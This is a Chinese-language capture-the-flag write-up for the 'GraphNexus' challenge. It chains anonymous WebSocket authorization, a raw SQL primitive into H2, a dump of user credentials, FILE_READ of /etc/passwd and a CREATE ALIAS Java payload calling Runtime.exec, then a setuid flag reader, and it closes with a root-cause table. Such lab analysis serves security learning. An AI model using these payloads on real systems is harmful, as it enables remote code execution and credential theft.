# GraphNexus 解题记录（DASCTF 羊城杯 2026-10-24）

- 靶机：`http://1.14.76.59:22015`（Ktor/Netty，GraphNexus v2.3.1）
- 难度：困难（500 分档）
- **Flag：`DASCTF{37924084998551910356221045517799}`**
- 耗时：侦察 → 利用约 40 分钟（含协议摸索）

---

## 一、攻击面

首页自述三个功能：实时协作（WebSocket）、图谱查询引擎（DSL）、GNX 二进制导入导出。
所有查询能力都收敛在 `/ws/collab` 的私有二进制协议 **NexusFrame**：

```
[MAGIC:4B = "NXUS"(0x4E585553)][OPCODE:1B][LENGTH:4B 大端][PAYLOAD:LENGTH]
```

opcode 实测：`0x01` HELLO、`0x03` SUBSCRIBE、`0x04` UPDATE、`0x05` QUERY、
`0x06` EXPORT、`0x07` IMPORT、`0x08` RESULT、`0x09` ERROR、`0x0A` OK。
注意：**长度字段是大端**，小端会被判 `INVALID_FRAME`。

## 二、漏洞链（5 步）

### 1. 匿名订阅直接发权限票据

裸连后只发 `op=0x03`（空载荷）即返回：

```json
{"subscribed":true,"token":"nxs_...","permissions":"read,query,export,import"}
```

`subscribe` 没有做任何身份校验，直接给出 read/query/export/import 全权限。
（先发 HELLO 再发 SUBSCRIBE 反而 `SUBSCRIBE_FAILED`，正确姿势是首帧直接 SUBSCRIBE。）

### 2. DSL 暴露 SQL 执行原语

向 `op=0x05` 发送任意字符串即按 DSL 解析，错误回包自带文档：

```
Available: NODES.count, NODES.all, NODES.find(query), EDGES.count, SQL(query)
```

`SQL(query)` 把括号内文本原样交给 H2 `Statement.execute`，无任何关键字过滤。

> 解析器怪癖：参数若以 `'` 结尾且紧跟 `)`，最后一个引号会被吞掉。
> 写 `SQL(SELECT 'HELLO')` 报语法错，写 `SQL(SELECT 'HELLO' )`（`)` 前留空格）才正常。

### 3. 拖库拿到管理员 API Token

```sql
SELECT * FROM GRAPH_USERS
```

| ID | USERNAME | PASSWORD_HASH | ROLE | API_TOKEN |
|----|----------|---------------|------|-----------|
| 1 | admin | a4b9c3d2e1f0 | admin | `gnx_567ab52cc8da4382ac14a13f` |
| 2 | viewer | b5c4d3e2f1a0 | viewer | null |

节点表 `KNOWLEDGE_NODES` 15 条均为演示数据，无 flag；`COLLAB_SESSIONS` 为空。

### 4. H2 文件读取 + Java 别名 → 命令执行

H2 2.2.224 自带 `FILE_READ`：

```sql
SELECT FILE_READ('/etc/passwd' )      -- 成功，确认以 appuser(1000) 运行
SELECT FILE_READ('/flag.txt' )        -- AccessDenied：文件存在，root 400
```

`/flag.txt` 权限 `-r-------- root root`，读不到；但 H2 支持 `CREATE ALIAS ... AS '<Java 源码>'`
（JVM 内含编译器），可直接落一个执行方法的别名：

```sql
CREATE ALIAS EXECMD AS 'String run(String c) throws Exception {
  java.io.InputStream in = Runtime.getRuntime().exec(new String[]{"sh","-c",c}).getInputStream();
  return new String(in.readAllBytes()); }'
```

随后 `SELECT EXECMD('id')` → `uid=1000(appuser)`。

### 5. setuid readflag 收尾

根目录存在 `-rwsr-xr-x root root /readflag`：

```sql
SELECT EXECMD('/readflag')   -->  DASCTF{37924084998551910356221045517799}
```

## 三、根因

| 层 | 问题 |
|---|---|
| 鉴权 | WebSocket 订阅接口无身份校验，匿名即发全权限 token |
| 查询引擎 | `SQL()` 原语把用户输入直接拼进 H2，等于公开一个 SQL 控制台 |
| 数据库 | H2 默认允许 `FILE_READ` 与 `CREATE ALIAS`（Java 编译执行），等于 RCE |
| 容器 | setuid `/readflag` 常驻根目录，RCE 后一步到位 |

## 四、复现代码

`work/graphenexus/gnc.py`（裸 socket WebSocket + NexusFrame 编解码，零第三方依赖）、
`gnq.py`（订阅 + 查询封装）、`rce.py`（EXECMD 命令执行）。
